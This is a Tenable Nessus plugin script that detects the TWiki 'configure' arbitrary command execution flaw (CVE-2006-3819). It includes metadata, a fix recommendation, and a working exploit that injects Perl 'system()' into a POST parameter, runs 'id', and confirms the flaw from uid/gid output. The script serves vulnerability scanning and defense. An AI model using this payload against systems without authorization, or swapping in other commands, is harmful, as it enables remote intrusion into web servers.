#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(22123);
  script_version("$Revision: 1.15 $");
  script_cvs_date("$Date: 2015/04/21 13:25:43 $");

  script_cve_id("CVE-2006-3819");
  script_bugtraq_id(19188);
  script_osvdb_id(27556);
  script_xref(name:"EDB-ID", value:"2110");
  script_xref(name:"EDB-ID", value:"2143");

  script_name(english:"TWiki configure Script Arbitrary Command Execution");
  script_summary(english:"Attempts to run a command using TWiki.");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server hosts a CGI script that is affected by an
arbitrary command execution vulnerability.");
  script_set_attribute(attribute:"description", value:
"The version of TWiki installed on the remote host uses an unsafe
'eval' in the 'bin/configure' script that can be exploited by an
unauthenticated attacker to execute arbitrary Perl code subject to the
privileges of the web server user id.");
  script_set_attribute(attribute:"see_also", value:"http://twiki.org/cgi-bin/view/Codev/SecurityAlertCmdExecWithConfigure");
  script_set_attribute(attribute:"solution", value:
"Apply HotFix 2 or later for TWiki 4.0.4. Alternatively, restrict
access to the TWiki configure script.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2006/07/27");
  script_set_attribute(attribute:"patch_publication_date", value:"2006/07/26");
  script_set_attribute(attribute:"plugin_publication_date", value:"2006/07/31");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:twiki:twiki");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006-2015 Tenable Network Security, Inc.");

  script_dependencies("twiki_detect.nasl");
  script_require_ports("Services/www", 80);
  script_require_keys("installed_sw/TWiki");

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("url_func.inc");
include("install_func.inc");

app = "TWiki";
get_install_count(app_name:app, exit_if_zero:TRUE);

port = get_http_port(default:80);

install = get_single_install(
  app_name : app,
  port     : port
);

dir = install['path'];
install_url = build_url(port:port, qs:dir);

if ("cgi-bin" >!< dir)
{
  dir = ereg_replace(pattern:"(/[^/]+/).*", string:dir, replace:"\1");
  dir = dir + "bin/";
}
else
  dir = dir - "view";

url = "configure";

# Check whether the affected script exists.
res = http_send_recv3(
  method       : "GET",
  item         : dir + url,
  port         : port,
  exit_on_fail : TRUE
);

# If it does...
if ('name="action" value="update"' >< res[2])
{
  # Try to exploit the flaw to run a command.
  cmd = "id";
  sploit = "TYPEOF:);system('"+ cmd +"');my @a=(";
  postdata = "action=update&" + urlencode(str:sploit) + "=nessus";

  res = http_send_recv3(
    method       : "POST",
    item         : dir + url,
    port         : port,
    content_type : "application/x-www-form-urlencoded",
    data         : postdata,
    exit_on_fail : TRUE
  );

  line = egrep(pattern:"uid=[0-9]+.*gid=[0-9]+.*", string:res[2]);
  if (!empty_or_null(line))
  {
    security_report_v4(
      port        : port,
      severity    : SECURITY_HOLE,
      cmd         : cmd,
      request     : make_list(http_last_sent_request()),
      output      : chomp(line)
    );
    exit(0);
  }
  else audit(AUDIT_WEB_APP_NOT_AFFECTED, app, install_url);
}
else exit(0, "The '/" + url + "' script does not appear to be accessible on the " + app + " install at " + install_url);
